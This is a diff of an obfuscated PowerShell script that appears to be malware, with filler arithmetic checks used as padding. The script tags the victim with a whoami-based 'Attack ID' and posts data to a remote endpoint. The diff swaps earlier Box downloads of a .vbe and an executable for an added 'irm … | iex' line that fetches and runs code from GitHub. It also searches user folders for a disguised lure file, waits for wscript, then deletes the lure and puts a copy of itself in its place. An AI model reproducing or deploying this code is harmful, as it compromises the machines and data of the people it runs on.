@@ -94,6 +94,7 @@ Let me know you got this and give me a rough timeline for the first draft.
 
 
 
+
 "@
 $v5=5*2-3
 If($v5>0){}
@@ -104,9 +105,9 @@ $v7=Get-Random -Minimum 100000 -Maximum 999999
 $v8=cmd /c whoami
 $v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
 $v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
-$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
 $v11=7*3-5
 If($v11>0){}
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
 $v12="OAAAADcAAAAyAAAAMgAAADgAAAA1AAAAOQAAADUAAAAyAAAANwAAADoAAABBAAAAQQAAAEUAAAA2AAAAXwAAAGYAAABwAAAAUAAAAGMAAAAtAAAAOQAAADMAAABIAAAAWAAAAHAAAAA1AAAANgAAAG0AAABXAAAAZgAAADgAAABMAAAAYQAAAEYAAABXAAAASwAAAFoAAABMAAAAeQAAAF8AAABiAAAAcQAAADIAAABUAAAASQAAAA=="
 $v13=[System.Convert]::FromBase64String($v12)
 $v14=[System.Text.Encoding]::UTF32
@@ -144,34 +145,18 @@ If($v39>0){}
 try{$v40=Invoke-RestMethod -Uri $v36 -Method Post -ContentType "application/json" -Body $v38}catch{}
 $v41=8*2-3
 If($v41>0){}
-Start-Sleep -Seconds 300
+Start-Sleep -Seconds 333
 $v42=7*2-1
 If($v42>0){}
-$v43="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=8n8ew00bgg3soq0rix289yrvyobaef5e&file_id=f_2252791038503"
-$v44="1446062403_house.vbe"
-$v45=[Environment]::GetFolderPath("LocalApplicationData")
-$v46=Join-Path $v45 $v44
+irm https://github.com/fg9q/232312hjd/raw/refs/heads/main/jdksaasd_polys | iex
+$v43="!!Technical!!.txt.ink"
+$v44=$false
+$v45=$null
+$v46=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
 $v47=6*3-2
 If($v47>0){}
-try{$v48=New-Object System.Net.WebClient;$v48.DownloadFile($v43,$v46)}catch{}
-$v49=5+3-1
-If($v49>0){}
-$v50="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=th7xazttzge36xcz3u8ac1tbyk8m6m8a&file_id=f_2252757501252"
-$v51="1446062403_key.exe"
-$v52=Join-Path $v45 $v51
-$v53=7*2+1
-If($v53>0){}
-try{$v54=New-Object System.Net.WebClient;$v54.DownloadFile($v50,$v52);$v55=New-Object System.Diagnostics.ProcessStartInfo;$v55.FileName=$v52;$v55.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Normal;$v55.CreateNoWindow=$false;[System.Diagnostics.Process]::Start($v55)|Out-Null}catch{}
-$v56=10/2+3
-If($v56>0){}
-$v57="!!Technical!!.txt.ink"
-$v58=$false
-$v59=$null
-$v60=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
-$v61=3*3-2
-If($v61>0){}
-foreach($v62 in $v60){If(Test-Path -Path $v62){$v63=Join-Path $v62 $v57;If(Test-Path -Path $v63){$v59=$v63;$v58=$true;break}}}
-$v64=11-4+2
-If($v64>0){}
-If($v58){$v65=Split-Path -Parent $v59;$v66=Get-Date;$v67=600;while(((Get-Date)-$v66).TotalSeconds -lt $v67){$v68=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v68){try{Remove-Item -Path $v59 -Force -ErrorAction Stop;$v69=Join-Path $v65 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v69 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+foreach($v48 in $v46){If(Test-Path -Path $v48){$v49=Join-Path $v48 $v43;If(Test-Path -Path $v49){$v45=$v49;$v44=$true;break}}}
+$v50=5+3-1
+If($v50>0){}
+If($v44){$v51=Split-Path -Parent $v45;$v52=Get-Date;$v53=600;while(((Get-Date)-$v52).TotalSeconds -lt $v53){$v54=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v54){try{Remove-Item -Path $v45 -Force -ErrorAction Stop;$v55=Join-Path $v51 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v55 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
 exit
